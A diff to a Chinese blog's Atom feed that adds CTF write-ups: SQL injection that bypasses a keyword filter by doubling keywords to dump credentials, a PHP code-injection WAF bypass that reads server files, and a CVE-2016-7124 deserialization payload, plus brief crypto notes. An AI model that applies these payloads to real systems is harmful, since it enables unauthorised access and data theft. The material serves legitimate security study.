+&lt;p&gt;尝试:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;1. 双写`oror`
+2. 隐写`oorr`
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;发现 2 是可行的，1 会报错，没有 &lt;code&gt;or&lt;/code&gt;  出现。这里明白是一个 &#39; 强&#39; 过滤。(&lt;strong&gt;即只要有 &lt;code&gt;or&lt;/code&gt;  字节出现在语法中就会过滤&lt;/strong&gt;，如 &lt;code&gt;inform,password&lt;/code&gt; )&lt;/p&gt;
+&lt;p&gt;用 &lt;code&gt;1&#39; oorr 1=1 -- &#39;&lt;/code&gt;  成功登入，发现有&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/babysql.jpg&#34; alt=&#34;babysql&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;之后用 &lt;code&gt;union select&lt;/code&gt;  通过报错，发现&lt;strong&gt; union，select 都被过滤&lt;/strong&gt;。&lt;/p&gt;
+&lt;p&gt;用 &lt;code&gt;uniunionon selselectect 1,1,1&lt;/code&gt;  查出列名，和对应显示。&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;palyload&lt;/strong&gt;&lt;/em&gt; 如下：&lt;/p&gt;
+&lt;p&gt;&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; uniunionon selselectect 1,database(),3 -- &#39;&lt;/span&gt;
+&lt;span class=&#34;token comment&#34;&gt;// geek&lt;/span&gt;
+&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; uniunionon selselectect 1,(selselectect group_concat(table_name)frfromom infoorrmation_schema.tables whewherere table_schema=&#39;&lt;/span&gt;geek&lt;span class=&#34;token string&#34;&gt;&#39;),3 -- &#39;&lt;/span&gt;
+&lt;span class=&#34;token comment&#34;&gt;// b4bsql&lt;/span&gt;
+&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; uniunionon selselectect 1,(selselectect group_concat(column_name)frfromom infoorrmation_schema.columns whewherere table_schema=&#39;&lt;/span&gt;geek&lt;span class=&#34;token string&#34;&gt;&#39; anandd table_name=&#39;&lt;/span&gt;b4bsql&lt;span class=&#34;token string&#34;&gt;&#39;),3 -- &#39;&lt;/span&gt;
+&lt;span class=&#34;token comment&#34;&gt;// id username password&lt;/span&gt;
+&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; uniunionon selselectect 1,2,(selselectect group_concat(concat(id,&#39;&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;,username,&#39;&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;,passwoorrd))frfromom geek.b4bsql) -- &#39;&lt;/span&gt;
+&lt;span class=&#34;token comment&#34;&gt;// 8 flag flag&amp;#123;11939082-38b7-412d-830a-cbe89b508804&amp;#125;&lt;/span&gt;
+&lt;span class=&#34;token comment&#34;&gt;/* 123&#39;  uniunionon selselectect 1,(selselectect group_concat(column_name)frfromom infoorrmation_schema.columns whwhereere table_name=&#39;b4bsql&#39; anandd table_schema=&#39;geek&#39;),(selselectect group_concat(concat(username,&#39; &#39;,passwoorrd,&#39; &#39;,id)) frfromom geek.b4bsql) -- &#39; */&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;这里发现一个&lt;strong&gt;问题&lt;/strong&gt;，使用&lt;/p&gt;
+&lt;p&gt;&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; uniunionon selselectect 1,2,(selselectect concat(id,&#39;&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;,username,&#39;&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;,passwoorrd)frfromom geek.b4bsql) -- &#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
+&lt;p&gt;&amp;lt;u&amp;gt; 报错 &#39; more than one row &#39; 但使用 group_concat 无报错。&amp;lt;/u&amp;gt;&lt;/p&gt;
+&lt;p&gt;&amp;lt;u&amp;gt;concat () 返回将相应字段连接成字符串的一列值。&amp;lt;/u&amp;gt;&lt;/p&gt;
+&lt;p&gt;&amp;lt;u&amp;gt;group_concat () 返回的是一串字符串。&amp;lt;/u&amp;gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;15roarctf-2019easy-calc&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#15roarctf-2019easy-calc&#34;&gt;#&lt;/a&gt; 15.[RoarCTF 2019]Easy Calc&lt;/h3&gt;
+&lt;p&gt;计算器。显然不是数据库。不用 SQL 注入。&lt;/p&gt;
+&lt;p&gt;输入 &lt;code&gt;1+1 / 1 /&#39; / 1&#39; / &amp;quot; &lt;/code&gt; 根据报错情况，没啥用。看源码。找到 calc.php.&lt;/p&gt;
+&lt;p&gt;可以传参 num, 传一下试试。有 waf,php 和 waf 的变量判断方式不一样.&lt;/p&gt;
+&lt;p&gt;用 php 代码注入.&lt;/p&gt;
+&lt;p&gt;所以传 &lt;code&gt;?%20?num=1&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;传入并执行了，根据它的过滤规则，堆叠注入.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;?%20num=1;var_dump(scandir(chr(47)))&lt;/code&gt; (chr (47) 是 &#39;/&#39;) 访问根目录，并打印.&lt;/p&gt;
+&lt;p&gt;找到 flagg.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;?&amp;amp;20num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;16极客大挑战-2019php&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#16极客大挑战-2019php&#34;&gt;#&lt;/a&gt; 16.[极客大挑战 2019] PHP&lt;/h3&gt;
+&lt;p&gt;进入题目根据提示：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;对网站备份扫描 *&amp;quot;&amp;quot;E:\burpsuite\&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1kb3FwOHZkeWh5bWIucHk=&#34;&gt; 备份扫描.py&lt;/span&gt;&amp;quot;&amp;quot;* 使用 Python 脚本.&lt;/p&gt;
+&lt;p&gt;得到 www.zip&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/1_16_01.png&#34; alt=&#34;01&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;查看三个 PHP 文件.&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/1_16_02.jpg&#34; alt=&#34;02&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/1_16_03.jpg&#34; alt=&#34;03&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;跟据代码，思路大致为&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;利用 get 方法传参 select，select 要序列化。&lt;/p&gt;
+&lt;p&gt;select 的内容是建立一个对象 Name，username=admin，password=100.&lt;/p&gt;
+&lt;p&gt;要绕过 wakeup () . //&lt;em&gt; 调用 unserialize () 时会自动调用魔法函数 wakeup ()&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;构造语法 (&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYmVqc29uLmNvbS9ydW5jb2RlL3BocC8=&#34;&gt;PHP 执行&lt;/span&gt;)&lt;/p&gt;
+&lt;p&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name-definition class-name&#34;&gt;Name&lt;/span&gt;
+&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;
+    &lt;span class=&#34;token keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$username&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;yesyesyes&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
+    &lt;span class=&#34;token keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$password&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;nonono&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
+    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$username&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$password&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
+    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;
+        &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$username&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
+        &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$password&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
+    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;
+&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;
+&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Name&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;admin&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;token function&#34;&gt;var_dump&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;br&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;token variable&#34;&gt;$b&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;serialize&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;br&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 输出序列化&lt;/span&gt;
+&lt;span class=&#34;token comment&#34;&gt;// O:4:&#34;Name&#34;:2:&amp;#123;s:14:&#34;Nameusername&#34;;s:5:&#34;admin&#34;;s:14:&#34;Namepassword&#34;;i:100;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
+&lt;p&gt;URL 不能识别 &lt;code&gt;&amp;quot;&lt;/code&gt; ，同时， &lt;code&gt;&amp;quot;Nameusername&amp;quot;&lt;/code&gt;  应为 &lt;code&gt;&amp;quot;%00Name%00username&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;因为成员（属性）是 private，所以要在类名和成员名前加 &lt;code&gt;%00&lt;/code&gt;  这个 url 编码是空的意思&lt;/p&gt;
+&lt;p&gt;序列化时生成的序列化字符串中类名前后本来就会有 0×00 也就是空&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;再利用 CVE-2016-7124 反序列化漏洞，属性数大于属性个数时，会跳过__wakeup () 魔术函数。&lt;/p&gt;
+&lt;p&gt;最终 payload 为&lt;/p&gt;
+&lt;p&gt;&lt;pre class=&#34;line-numbers language-uri&#34; data-language=&#34;uri&#34;&gt;&lt;code class=&#34;language-uri&#34;&gt;&lt;span class=&#34;token path&#34;&gt;&lt;span class=&#34;token path-separator&#34;&gt;/&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token query&#34;&gt;&lt;span class=&#34;token query-delimiter&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;token pair&#34;&gt;&lt;span class=&#34;token key&#34;&gt;select&lt;/span&gt;=&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;token path&#34;&gt;O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
+&lt;p&gt;解释一下这里利用了 &lt;code&gt;echo urlencode($b)&lt;/code&gt;  直接将其 URLencode，再将属性数改大。&lt;/p&gt;
+&lt;h2 id=&#34;二-crypto&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二-crypto&#34;&gt;#&lt;/a&gt; 二、CRYPTO&lt;/h2&gt;
+&lt;p&gt;摩丝密码的英文只有大写&lt;/p&gt;
+&lt;p&gt;&lt;pre class=&#34;line-numbers language-cpp&#34; data-language=&#34;cpp&#34;&gt;&lt;code class=&#34;language-cpp&#34;&gt;摩斯电码只有大写，将它改成大写就行啦&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
+&lt;p&gt;1.URL&lt;/p&gt;
+&lt;p&gt;2.base-16，base-32，base-64&lt;/p&gt;
+&lt;p&gt;3.md5&lt;/p&gt;
+&lt;p&gt;4.ROT13 旋转加密&lt;/p&gt;
+&lt;h3 id=&#34;1password&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1password&#34;&gt;#&lt;/a&gt; 1.PASSWORD&lt;/h3&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/image-20220930164451487.png&#34; alt=&#34;image-20220930164451487&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;就是猜。。。&lt;/p&gt;
+&lt;p zs19900315=&#34;&#34;&gt;flag&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;私钥 d 攻击&lt;/p&gt;
+&lt;p&gt;Coppersmith 相关攻击&lt;/p&gt;
+&lt;p&gt;ECC&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;2变异凯撒&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2变异凯撒&#34;&gt;#&lt;/a&gt; 2. 变异凯撒&lt;/h3&gt;
+&lt;p Caesar_variation=&#34;&#34;&gt;flag&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;凯撒加密，即将原私钥通过 ASCII 移位的方式加密。&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;得到密文。可能每处移位的不一样。&lt;/p&gt;
+&lt;p&gt;这里是&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/image-20220930170155624.png&#34; alt=&#34;image-20220930170155624&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;afZ_r9VYfScOeO_UL^RWUc&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;根据格式，对前 5 位，按照 ASCII 表解密为&lt;strong&gt; flag {&lt;/strong&gt;，从而推出加密规律。&lt;/p&gt;
+&lt;p&gt;udf 提权，mof 提权&lt;/p&gt;
+&lt;p&gt;宽字节注入限制&lt;/p&gt;
+&lt;p&gt;什么时候用，&lt;/p&gt;
+&lt;p&gt;怎么用，用在哪，&lt;/p&gt;
+&lt;p&gt;为什么要用。&lt;/p&gt;
 </content>
-        <category term="网络安全" scheme="http://example.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" />
+        <category term="CTF" scheme="http://example.com/categories/CTF/" />
         <category term="CTF" scheme="http://example.com/tags/CTF/" />
-        <updated>2022-09-21T14:52:24.722Z</updated>
+        <updated>2022-11-01T01:47:52.705Z</updated>
     </entry>
     <entry>
         <id>http://example.com/2022/09/21/%E6%95%B0%E5%AD%A6%E7%AC%94%E8%AE%B0/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%94%E8%AE%B0%E4%B8%80/</id>
@@ -586,8 +743,8 @@
 &lt;h2 id=&#34;7绕过select注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#7绕过select注入&#34;&gt;#&lt;/a&gt; 7. 绕过 select 注入&lt;/h2&gt;
 &lt;p&gt;使用 handler 语法。&lt;/p&gt;
 </content>
-        <category term="网络安全" scheme="http://example.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" />
-        <category term="白帽" scheme="http://example.com/tags/%E7%99%BD%E5%B8%BD/" />
+        <category term="CTF" scheme="http://example.com/categories/CTF/" />
+        <category term="CTF" scheme="http://example.com/tags/CTF/" />
         <updated>2022-09-19T14:18:04.921Z</updated>
     </entry>
     <entry>
